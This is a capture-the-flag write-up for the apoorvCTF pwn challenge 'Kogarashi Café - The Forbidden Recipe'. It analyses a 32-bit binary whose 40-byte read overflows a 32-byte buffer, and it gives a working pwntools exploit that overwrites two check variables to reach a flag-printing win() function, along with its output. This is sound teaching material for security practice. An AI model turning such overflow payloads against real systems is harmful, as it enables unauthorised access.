---
date: 2025-03-07 21:15:53 +02:00
categories: [apoorvCTF, Pwn]
tags: [Pwn, CTF, apoorvCTF]
---

This is a writeup of the Pwn challenge Kogarashi Café - The Forbidden Recipe by [apoorvCTF](https://apoorvctf.iiitkottayam.ac.in/) 
#### Points: 173
# Premise
The final test. One last order, one last chance. Choose carefully—the café remembers.

`nc chals1.apoorvctf.xyz 3002`
## Challenge files:

[forbidden_recipe](https://github.com/CSYClubIIITK/CTF-Writeups/blob/main/ApoorvCTF-25-Writeups/BinExp/Kogarashi%20Caf%C3%A9%20-%20The%20Forbidden%20Recipe/files/forbidden_recipe)

# Observations
Looking at the challenge file, we have a single executable, we as per usual start by running file and checksec against it:

![file_checksec](/assets/images/apoorvCTF/cafe3/file_checksec.png)

As seen previously, we're working with a 32 bit executable with few settings for protection.

We again use [Detect it Easy (DIE)](https://github.com/horsicq/Detect-It-Easy) to see what lang the program is written in.

![DIE](/assets/images/apoorvCTF/cafe3/DIE.png)

As we can see, the program looks like it was made in C/C++. Our next step from here is to load the program into [IDA](https://hex-rays.com/ida-free)

We opening the program, and observe the following functions since they look interesting
![IDA functions](/assets/images/apoorvCTF/cafe3/IDA_functions.png)

We can start off by checking main(), as we can see it doesnt do much, other than calling vuln() so we proceed to it.
![main functions](/assets/images/apoorvCTF/cafe3/IDA_main.png)

Here we see the program prints a welcome string, and reads some input from the user, there are also 2 additional varialbes that are checked, and if their contents match `0xC0FF33` and `0xDECAFBAD` we get a call to the win() function.
![order_coffee function](/assets/images/apoorvCTF/cafe3/IDA_vuln.png)

The user input variable has a size of 32 characters, but the read function reads 40 characters, we know we need to overwrite 2 variables, and what values they need to be, so we'll keep this in mind going forwards

Here in the win function, the execution flow is quite straightforward, it opens the flag.txt file and prints out its contents
![brew_coffee function](/assets/images/apoorvCTF/cafe3/IDA_win.png)

# Solution
With all of our findings, I've developed the following python script, using [pwntools](https://github.com/Gallopsled/pwntools)

```python
from pwn import *

padding = b"A" * 32
coffee = p32(0x00C0FF33)
decafbad = p32(0xDECAFBAD)

#Craft payload string, we need to add the payload first, then the two variables in correct order
payload = padding + decafbad + coffee

#run program
#target = process('./forbidden_recipe')
target = remote('chals1.apoorvctf.xyz', 3002)

target.recvline()
target.recvline()
target.sendline(payload)

target.interactive()
```

Running this script gives us the following output:
```bash
[+] Starting local process './forbidden_recipe': pid 1234567
[*] Switching to interactive mode
[*] Process './forbidden_recipe' stopped with exit code 0 (pid 1234567)
Barista: "Ah... I knew you'd figure it out. One moment."
Barista: "Ah... I see you've returned for the special blend."
apoorvctf{d3caf_is_bad_f0r_0verfl0ws}

[*] Got EOF while reading in interactive
$
```

Which gives us the flag:
> apoorvctf{d3caf_is_bad_f0r_0verfl0ws}
{: .prompt-tip }


# Tools and sources used:
- [IDA Free](https://hex-rays.com/ida-free)
- [pwntools](https://github.com/Gallopsled/pwntools)
- [Detect It Easy](https://github.com/horsicq/Detect-It-Easy)
- [checksec](https://github.com/slimm609/checksec)
